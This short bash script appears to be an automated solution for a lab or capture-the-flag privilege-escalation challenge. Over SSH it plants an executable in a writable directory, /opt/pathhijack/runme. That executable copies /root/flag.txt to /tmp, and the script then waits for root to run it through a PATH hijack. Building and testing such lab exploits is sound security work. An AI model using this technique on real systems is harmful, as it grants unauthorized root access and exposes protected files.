#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/path_flag
printf "%s\n" "#!/bin/sh" "cat /root/flag.txt > /tmp/path_flag" > /opt/pathhijack/runme
chmod 755 /opt/pathhijack/runme
for i in $(seq 1 45); do
  if test -r /tmp/path_flag && grep -q FLAG /tmp/path_flag; then
    cat /tmp/path_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for PATH hijack" >&2
exit 1
')"
assert_root_output "${out}"
